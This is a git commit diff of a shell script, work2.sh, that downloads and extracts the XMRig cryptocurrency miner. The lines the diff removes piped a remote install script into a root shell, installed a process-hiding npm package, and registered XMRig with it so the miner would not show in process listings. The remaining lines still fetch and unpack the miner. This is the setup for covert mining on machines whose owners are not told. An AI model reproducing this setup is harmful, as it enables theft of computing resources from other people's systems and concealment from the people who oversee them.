73ae781c82a00cf97e22e9cce5636936cde54d9d
Geraldy Olang <97717251+geraldyolang11@users.noreply.github.com>
2022-02-07 13:23:55 +0800

    Update work2.sh

--- work2.sh
+++ work2.sh
@@ -1,10 +1,4 @@
 sudo apt-get update &&
-sudo apt-get upgrade -y;
-2 &&
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - &&
-sudo apt install nodejs &&
-npm i -g node-process-hider &&
-sudo ph add xmrig &&
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz &&
 tar -zxf xmrig-6.16.2-bionic-x64.tar.gz &&
 cd xmrig-6.16.2 &&
